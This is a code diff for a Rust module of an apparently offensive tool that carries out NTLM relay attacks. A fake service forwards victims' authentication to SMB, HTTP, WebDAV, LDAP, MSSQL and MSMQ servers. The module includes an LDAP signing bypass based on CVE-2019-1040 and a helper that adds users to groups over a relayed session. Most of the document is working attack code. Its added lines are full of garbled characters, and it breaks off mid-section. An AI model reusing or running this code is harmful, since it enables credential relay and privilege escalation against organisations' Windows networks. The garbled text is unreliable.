@@ -7,7 +7,7 @@
 //!
 //! 1. Victim connects to our fake service (responder)
 //! 2. Victim sends NTLM NEGOTIATE
-//! 3. We forward NEGOTIATE to target → get target's CHALLENGE
+//! 3. We forward NEGOTIATE to target â†’ get target's CHALLENGE
 //! 4. We send the target's CHALLENGE back to victim
 //! 5. Victim computes AUTHENTICATE against target's challenge
 //! 6. We forward AUTHENTICATE to target
@@ -17,36 +17,42 @@
 //! the target's challenge before it can produce AUTHENTICATE.
 
 use crate::{Protocol, RelayError, RelayTarget, Result};
+use overthrone_core::error::OverthroneError;
 use std::collections::HashMap;
 use std::net::SocketAddr;
-use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
+use std::sync::{Arc, RwLock};
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
+use tokio::sync::Semaphore;
 use tracing::{debug, info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // NTLM Protocol Constants
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // NTLM Signing Flags & AvPair Constants ([MS-NLMP])
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-/// NTLMSSP_NEGOTIATE_SIGN — client/server support message signing
+/// NTLMSSP_NEGOTIATE_SIGN â€” client/server support message signing
 const NTLMSSP_NEGOTIATE_SIGN: u32 = 0x0000_0010;
-/// NTLMSSP_NEGOTIATE_SEAL — client/server support message sealing
+/// NTLMSSP_NEGOTIATE_SEAL â€” client/server support message sealing
 const NTLMSSP_NEGOTIATE_SEAL: u32 = 0x0000_0020;
-/// NTLMSSP_NEGOTIATE_ALWAYS_SIGN — signing is always performed
+/// NTLMSSP_NEGOTIATE_ALWAYS_SIGN â€” signing is always performed
 const NTLMSSP_NEGOTIATE_ALWAYS_SIGN: u32 = 0x0000_8000;
 
 /// NTLM message types
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum NtlmMessageType {
+    /// `` variant
     Negotiate = 1,
+    /// `` variant
     Challenge = 2,
+    /// `` variant
     Authenticate = 3,
 }
 
@@ -66,14 +72,32 @@ pub fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// Relay State
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+/// Relay state
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+pub enum RelayState {
+    /// Relay is stopped
+    #[default]
+    Stopped,
+    /// Relay is running
+    Running,
+    /// Relay encountered an error
+    Error(String),
+}
+
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Relay Configuration
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Relay configuration
 #[derive(Debug, Clone)]
 pub struct RelayConfig {
+    /// IP address to listen on
     pub listen_ip: String,
+    /// targets field
     pub targets: Vec<RelayTarget>,
     /// Try all targets in round-robin fashion
     pub round_robin: bool,
@@ -85,6 +109,10 @@ pub struct RelayConfig {
     /// Uses the "Drop the MIC" technique (CVE-2019-1040) to relay NTLM
     /// authentication to LDAP targets that have signing set to "Negotiate".
     pub ldap_signing_bypass: bool,
+    /// Maximum number of retries per relay attempt (across targets)
+    pub max_retries: u32,
+    /// Maximum concurrent connections
+    pub max_connections: usize,
 }
 
 impl Default for RelayConfig {
@@ -96,27 +124,51 @@ impl Default for RelayConfig {
             remove_on_success: true,
             timeout_secs: 30,
             ldap_signing_bypass: true,
+            max_retries: 3,
+            max_connections: 64,
         }
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Relay Statistics
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Relay statistics
-#[derive(Debug, Clone, Default)]
+#[derive(Debug, Default)]
 pub struct RelayStats {
-    pub successful_relays: u32,
-    pub failed_relays: u32,
-    pub active_connections: u32,
-    pub total_attempts: u32,
-    pub by_protocol: HashMap<String, u32>,
+    /// successful relays field
+    pub successful_relays: AtomicU32,
+    /// failed relays field
+    pub failed_relays: AtomicU32,
+    /// active connections field
+    pub active_connections: AtomicU32,
+    /// Total count
+    pub total_attempts: AtomicU32,
+    /// Network protocol variant
+    pub stats_by_protocol: Arc<RwLock<HashMap<String, u32>>>,
 }
 
-// ═══════════════════════════════════════════════════════════
+impl Clone for RelayStats {
+    fn clone(&self) -> Self {
+        Self {
+            successful_relays: AtomicU32::new(self.successful_relays.load(Ordering::Relaxed)),
+            failed_relays: AtomicU32::new(self.failed_relays.load(Ordering::Relaxed)),
+            active_connections: AtomicU32::new(self.active_connections.load(Ordering::Relaxed)),
+            total_attempts: AtomicU32::new(self.total_attempts.load(Ordering::Relaxed)),
+            stats_by_protocol: Arc::new(RwLock::new(
+                self.stats_by_protocol
+                    .read()
+                    .map(|guard| guard.clone())
+                    .unwrap_or_else(|_| HashMap::new()),
+            )),
+        }
+    }
+}
+
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Two-Phase Relay State
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// A pending relay connection that has completed Phase 1 (negotiate)
 /// and is waiting for Phase 2 (authenticate).
@@ -137,10 +189,15 @@ pub struct PendingRelay {
 
 /// Result of a successful relay (Phase 2 complete)
 pub struct RelayedSession {
+    /// Target domain FQDN
     pub target: RelayTarget,
+    /// Username for authentication
     pub username: String,
+    /// Domain FQDN
     pub domain: String,
+    /// stream field
     pub stream: TcpStream,
+    /// Stable unique identifier.
     pub smb_session_id: u64,
     /// LDAP message ID counter (starts at 3 after SASL bind used 1 & 2)
     ldap_msg_id: u32,
@@ -154,7 +211,6 @@ impl RelayedSession {
     }
 
     /// Add a user DN to a group via LDAP Modify (add member attribute).
-    ///
     /// Only usable when the relay target is LDAP/LDAPS.
     pub async fn ldap_add_to_group(&mut self, user_dn: &str, group_dn: &str) -> Result<()> {
         let msg_id = self.next_ldap_id();
@@ -173,15 +229,14 @@ impl RelayedSession {
 
         let code = parse_ldap_generic_result(&buf[..len], 0x67)?;
         if code == 0 {
-            info!("✓ LDAP modify success: added {} to {}", user_dn, group_dn);
+            info!("âœ“ LDAP modify success: added {} to {}", user_dn, group_dn);
             Ok(())
         } else {
-            Err(RelayError::Protocol(format!("LDAP modify failed — result code {}", code)).into())
+            Err(RelayError::Protocol(format!("LDAP modify failed â€” result code {}", code)).into())
         }
     }
 
     /// Perform a base-scope LDAP search (e.g. read an object's attributes).
-    ///
     /// Returns raw LDAP SearchResultEntry bytes for caller to parse.
     pub async fn ldap_search(
         &mut self,
@@ -231,42 +286,49 @@ impl RelayedSession {
         if code == 0 {
             Ok(())
         } else {
-            Err(RelayError::Protocol(format!("LDAP modify-replace failed — code {}", code)).into())
+            Err(
+                RelayError::Protocol(format!("LDAP modify-replace failed â€” code {}", code))
+                    .into(),
+            )
         }
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // NTLM Relay Handler
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-/// NTLM Relay handler — fully async, two-phase architecture
+/// NTLM Relay handler â€” fully async, two-phase architecture
 pub struct NtlmRelay {
     config: RelayConfig,
-    running: bool,
+    state: RelayState,
     stats: RelayStats,
     pending: HashMap<u64, PendingRelay>,
     next_id: AtomicU64,
     /// Target round-robin index
     target_idx: usize,
+    /// Connection pool semaphore
+    pool: Arc<Semaphore>,
 }
 
 impl NtlmRelay {
     /// Create a new NTLM relay with the given configuration
     pub fn new(config: RelayConfig) -> Self {
+        let max_conn = config.max_connections.max(1);
         Self {
             config,
-            running: false,
+            state: RelayState::Stopped,
             stats: RelayStats::default(),
             pending: HashMap::new(),
             next_id: AtomicU64::new(1),
             target_idx: 0,
+            pool: Arc::new(Semaphore::new(max_conn)),
         }
     }
 
     /// Start the relay
     pub async fn start(&mut self) -> Result<()> {
-        if self.running {
+        if self.state != RelayState::Stopped {
             return Err(RelayError::Config("Relay already running".to_string()).into());
         }
 
@@ -283,22 +345,22 @@ impl NtlmRelay {
             info!("  -> {}://{}", target.protocol, target.address);
         }
 
-        self.running = true;
+        self.state = RelayState::Running;
         Ok(())
     }
 
     /// Stop the relay
     pub async fn stop(&mut self) -> Result<()> {
-        if !self.running {
+        if self.state == RelayState::Stopped {
             return Ok(());
         }
 
         info!(
-            "Stopping NTLM relay — dropping {} pending relays",
+            "Stopping NTLM relay â€” dropping {} pending relays",
             self.pending.len()
         );
         self.pending.clear();
-        self.running = false;
+        self.state = RelayState::Stopped;
         info!("NTLM relay stopped");
         Ok(())
     }
@@ -310,7 +372,7 @@ impl NtlmRelay {
 
     /// Check if relay is running
     pub fn is_running(&self) -> bool {
-        self.running
+        self.state == RelayState::Running
     }
 
     /// Get configuration
@@ -338,143 +400,214 @@ impl NtlmRelay {
         Some(target)
     }
 
-    // ─────────────────────────────────────────────────────────
-    // Phase 1: Forward NEGOTIATE → get CHALLENGE
-    // ─────────────────────────────────────────────────────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    // Phase 1: Forward NEGOTIATE â†’ get CHALLENGE
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     /// Phase 1 of NTLM relay.
-    ///
     /// Connects to the next available target, forwards the victim's
     /// NEGOTIATE message, and returns the target's CHALLENGE.
-    ///
     /// The caller (responder) must send this CHALLENGE back to the
     /// victim, then call `relay_authenticate()` with the victim's
     /// AUTHENTICATE response.
+    /// Retries across targets on failure up to `max_retries` times.
     pub async fn relay_negotiate(&mut self, ntlm_negotiate: &[u8]) -> Result<(u64, Vec<u8>)> {
-        let target = self
-            .next_target()
-            .ok_or_else(|| RelayError::Config("No relay targets available".into()))?;
+        let max_attempts = self.config.max_retries.max(1);
+        let mut last_error: Option<OverthroneError> = None;
 
-        self.stats.total_attempts += 1;
+        for attempt in 0..max_attempts {
+            let target = self
+                .next_target()
+                .ok_or_else(|| RelayError::Config("No relay targets available".into()))?;
 
-        debug!(
-            "Phase 1: connecting to {}://{}",
-            target.protocol, target.address
-        );
+            self.stats.total_attempts.fetch_add(1, Ordering::Relaxed);
 
-        let timeout = Duration::from_secs(self.config.timeout_secs);
+            debug!(
+                "Phase 1 attempt {}/{}: connecting to {}://{}",
+                attempt + 1,
+                max_attempts,
+                target.protocol,
+                target.address
+            );
 
-        match target.protocol {
-            Protocol::Smb => {
-                let (stream, challenge, session_id, msg_id) = self
-                    .smb_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
-                    .await?;
+            let timeout = Duration::from_secs(self.config.timeout_secs);
 
-                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+            let result = match target.protocol {
+                Protocol::Smb => {
+                    let _permit = self
+                        .pool
+                        .acquire()
+                        .await
+                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;
 
-                info!(
-                    "Phase 1 complete → relay_id={}, target={}://{}",
-                    relay_id, target.protocol, target.address
-                );
+                    let (stream, challenge, session_id, msg_id) = self
+                        .smb_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                        .await?;
 
-                self.pending.insert(
-                    relay_id,
-                    PendingRelay {
-                        relay_id,
-                        target,
-                        stream,
-                        challenge: challenge.clone(),
-                        smb_session_id: session_id,
-                        smb_message_id: msg_id,
-                    },
-                );
+                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
 
-                Ok((relay_id, challenge))
-            }
-            Protocol::Http | Protocol::Https => {
-                let (stream, challenge) = self
-                    .http_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
-                    .await?;
-
-                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
-
-                self.pending.insert(
-                    relay_id,
-                    PendingRelay {
-                        relay_id,
-                        target,
-                        stream,
-                        challenge: challenge.clone(),
-                        smb_session_id: 0,
-                        smb_message_id: 0,
-                    },
-                );
-
-                Ok((relay_id, challenge))
-            }
-            Protocol::Ldap | Protocol::Ldaps => {
-                let (stream, mut challenge) = self
-                    .ldap_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
-                    .await?;
-
-                // LDAP signing bypass: strip SIGN/SEAL/ALWAYS_SIGN flags from
-                // the target's CHALLENGE before the victim sees it. This ensures
-                // the victim won't negotiate signing and won't compute a MIC,
-                // so the relayed AUTHENTICATE is accepted without LDAP signing.
-                if self.config.ldap_signing_bypass {
-                    strip_signing_flags_from_challenge(&mut challenge);
-                    debug!(
-                        "LDAP signing bypass: stripped SIGN/SEAL flags from challenge for {}",
-                        target.address
+                    info!(
+                        "Phase 1 complete â†’ relay_id={}, target={}://{}",
+                        relay_id, target.protocol, target.address
                     );
+
+                    self.pending.insert(
+                        relay_id,
+                        PendingRelay {
+                            relay_id,
+                            target,
+                            stream,
+                            challenge: challenge.clone(),
+                            smb_session_id: session_id,
+                            smb_message_id: msg_id,
+                        },
+                    );
+
+                    Ok((relay_id, challenge))
                 }
+                Protocol::Http | Protocol::Https | Protocol::Webdav => {
+                    let _permit = self
+                        .pool
+                        .acquire()
+                        .await
+                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;
 
-                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+                    let (stream, challenge) = self
+                        .http_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                        .await?;
 
-                self.pending.insert(
-                    relay_id,
-                    PendingRelay {
+                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                    self.pending.insert(
                         relay_id,
-                        target,
-                        stream,
-                        challenge: challenge.clone(),
-                        smb_session_id: 0,
-                        smb_message_id: 0,
-                    },
-                );
+                        PendingRelay {
+                            relay_id,
+                            target,
+                            stream,
+                            challenge: challenge.clone(),
+                            smb_session_id: 0,
+                            smb_message_id: 0,
+                        },
+                    );
 
-                Ok((relay_id, challenge))
-            }
-            Protocol::Mssql => {
-                let (stream, challenge) = self
-                    .mssql_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
-                    .await?;
+                    Ok((relay_id, challenge))
+                }
+                Protocol::Ldap | Protocol::Ldaps => {
+                    let _permit = self
+                        .pool
+                        .acquire()
+                        .await
+                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;
 
-                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+                    let (stream, mut challenge) = self
+                        .ldap_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                        .await?;
 
-                self.pending.insert(
-                    relay_id,
-                    PendingRelay {
+                    if self.config.ldap_signing_bypass {
+                        strip_signing_flags_from_challenge(&mut challenge);
+                        debug!(
+                            "LDAP signing bypass: stripped SIGN/SEAL flags from challenge for {}",
+                            target.address
+                        );
+                    }
+
+                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                    self.pending.insert(
                         relay_id,
-                        target,
-                        stream,
-                        challenge: challenge.clone(),
-                        smb_session_id: 0,
-                        smb_message_id: 0,
-                    },
-                );
+                        PendingRelay {
+                            relay_id,
+                            target,
+                            stream,
+                            challenge: challenge.clone(),
+                            smb_session_id: 0,
+                            smb_message_id: 0,
+                        },
+                    );
 
-                Ok((relay_id, challenge))
+                    Ok((relay_id, challenge))
+                }
+                Protocol::Mssql => {
+                    let _permit = self
+                        .pool
+                        .acquire()
+                        .await
+                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;
+
+                    let (stream, challenge) = self
+                        .mssql_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                        .await?;
+
+                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                    self.pending.insert(
+                        relay_id,
+                        PendingRelay {
+                            relay_id,
+                            target,
+                            stream,
+                            challenge: challenge.clone(),
+                            smb_session_id: 0,
+                            smb_message_id: 0,
+                        },
+                    );
+
+                    Ok((relay_id, challenge))
+                }
+                Protocol::Msmq => {
+                    let _permit = self
+                        .pool
+                        .acquire()
+                        .await
+                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;
+
+                    let (stream, challenge) = self
+                        .msmq_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                        .await?;
+
+                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                    self.pending.insert(
+                        relay_id,
+                        PendingRelay {
+                            relay_id,
+                            target,
+                            stream,
+                            challenge: challenge.clone(),
+                            smb_session_id: 0,
+                            smb_message_id: 0,
+                        },
+                    );
+
+                    Ok((relay_id, challenge))
+                }
+            };
+
+            match result {
+                Ok(val) => return Ok(val),
+                Err(e) => {
+                    warn!(
+                        "Phase 1 attempt {}/{} failed: {}",
+                        attempt + 1,
+                        max_attempts,
+                        e
+                    );
+                    last_error = Some(e);
+                }
             }
         }
+
+        let err = last_error.unwrap_or_else(|| {
+            RelayError::Config("All relay targets failed after exhausting retries".into()).into()
+        });
+        Err(err)
     }
 
-    // ─────────────────────────────────────────────────────────
-    // Phase 2: Forward AUTHENTICATE → get session
-    // ─────────────────────────────────────────────────────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    // Phase 2: Forward AUTHENTICATE â†’ get session
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     /// Phase 2 of NTLM relay.
-    ///
     /// Takes the relay_id from Phase 1 and the victim's AUTHENTICATE
     /// message (computed against the target's challenge), forwards it
     /// to the target, and returns the authenticated session.
@@ -504,7 +637,7 @@ impl NtlmRelay {
                 )
                 .await
             }
-            Protocol::Http | Protocol::Https => {
+            Protocol::Http | Protocol::Https | Protocol::Webdav => {
                 self.http_authenticate(&mut pending.stream, ntlm_authenticate, &pending.target)
                     .await
             }
@@ -529,21 +662,25 @@ impl NtlmRelay {
                 self.mssql_authenticate(&mut pending.stream, ntlm_authenticate)
                     .await
             }
+            Protocol::Msmq => {
+                self.msmq_authenticate(&mut pending.stream, ntlm_authenticate)
+                    .await
+            }
         };
 
         match result {
             Ok(()) => {
                 info!(
-                    "✓ Relay successful: {}\\{} → {}://{}",
+                    "âœ“ Relay successful: {}\\{} â†’ {}://{}",
                     domain, username, pending.target.protocol, pending.target.address
                 );
 
-                self.stats.successful_relays += 1;
-                *self
-                    .stats
-                    .by_protocol
-                    .entry(pending.target.protocol.to_string())
-                    .or_insert(0) += 1;
+                self.stats.successful_relays.fetch_add(1, Ordering::Relaxed);
+                if let Ok(mut guard) = self.stats.stats_by_protocol.write() {
+                    *guard
+                        .entry(pending.target.protocol.to_string())
+                        .or_insert(0) += 1;
+                }
 
                 if self.config.remove_on_success {
                     let addr = pending.target.address;
@@ -560,9 +697,9 @@ impl NtlmRelay {
                 })
             }
             Err(e) => {
-                self.stats.failed_relays += 1;
+                self.stats.failed_relays.fetch_add(1, Ordering::Relaxed);
                 warn!(
-                    "✗ Relay failed: {}\\{} → {}: {}",
+                    "âœ— Relay failed: {}\\{} â†’ {}: {}",
                     domain, username, pending.target.address, e
                 );
                 Err(e)
@@ -570,9 +707,9 @@ impl NtlmRelay {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // SMB Relay — Phase 1
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // SMB Relay â€” Phase 1
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     /// Connect to SMB target, do SMB2 negotiate, then session setup
     /// with the victim's NTLM negotiate. Returns (stream, challenge, session_id, msg_id).
@@ -594,7 +731,7 @@ impl NtlmRelay {
         let mut buf = vec![0u8; 65536];
         let mut msg_id: u64 = 0;
 
-        // ── SMB2 NEGOTIATE ──
+        // â”€â”€ SMB2 NEGOTIATE â”€â”€
         let smb_negotiate = build_smb2_negotiate(msg_id);
         msg_id += 1;
         stream
@@ -613,7 +750,7 @@ impl NtlmRelay {
 
         debug!("SMB2 negotiate OK with {}", target.address);
 
-        // ── SESSION_SETUP with NTLM NEGOTIATE ──
+        // â”€â”€ SESSION_SETUP with NTLM NEGOTIATE â”€â”€
         let session_setup = build_smb2_session_setup(ntlm_negotiate, 0, msg_id);
         msg_id += 1;
         stream
@@ -630,7 +767,7 @@ impl NtlmRelay {
             return Err(RelayError::Protocol("Session setup response too short".into()).into());
         }
 
-        // Check status — STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
+        // Check status â€” STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
         let status = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
         if status != 0xC0000016 {
             return Err(RelayError::Protocol(format!(
@@ -656,9 +793,9 @@ impl NtlmRelay {
         Ok((stream, challenge, session_id, msg_id))
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // SMB Relay — Phase 2
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // SMB Relay â€” Phase 2
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     async fn smb_session_setup_auth(
         &self,
@@ -694,9 +831,9 @@ impl NtlmRelay {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // HTTP Relay — Phase 1 & 2
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // HTTP Relay â€” Phase 1 & 2
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     async fn http_negotiate_and_challenge(
         &self,
@@ -783,7 +920,7 @@ impl NtlmRelay {
 
         let response_str = String::from_utf8_lossy(&response[..len]);
 
-        // Only 200 OK means success — 401 means auth FAILED
+        // Only 200 OK means success â€” 401 means auth FAILED
         if response_str.starts_with("HTTP/1.1 200") || response_str.starts_with("HTTP/1.0 200") {
             Ok(())
         } else {
@@ -792,9 +929,9 @@ impl NtlmRelay {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // LDAP Relay — Phase 1 & 2
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // LDAP Relay â€” Phase 1 & 2
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     async fn ldap_negotiate_and_challenge(
         &self,
@@ -850,7 +987,7 @@ impl NtlmRelay {
             .await
             .map_err(|e| RelayError::Network(format!("LDAP auth read: {}", e)))?;
 
-        // Parse LDAP bind response — find the resultCode
+        // Parse LDAP bind response â€” find the resultCode
         let result_code = parse_ldap_bind_result(&response[..len])?;
 
         if result_code == 0 {
@@ -864,9 +1001,9 @@ impl NtlmRelay {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // MSSQL/TDS Relay — Phase 1 & 2
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // MSSQL/TDS Relay â€” Phase 1 & 2
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     async fn mssql_negotiate_and_challenge(
         &self,
@@ -951,7 +1088,7 @@ impl NtlmRelay {
             for &byte in &buf[8..len.saturating_sub(1)] {
                 if byte == 0xAA {
                     return Err(RelayError::Authentication(
-                        "TDS returned ERROR token — auth failed".into(),
+                        "TDS returned ERROR token â€” auth failed".into(),
                     )
                     .into());
                 }
@@ -959,28 +1096,337 @@ impl NtlmRelay {
         }
 
         Err(RelayError::Authentication(format!(
-            "MSSQL auth failed — TDS packet type 0x{:02X}",
+            "MSSQL auth failed â€” TDS packet type 0x{:02X}",
             buf[0]
         ))
         .into())
     }
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // MSMQ Relay â€” Phase 1 & 2
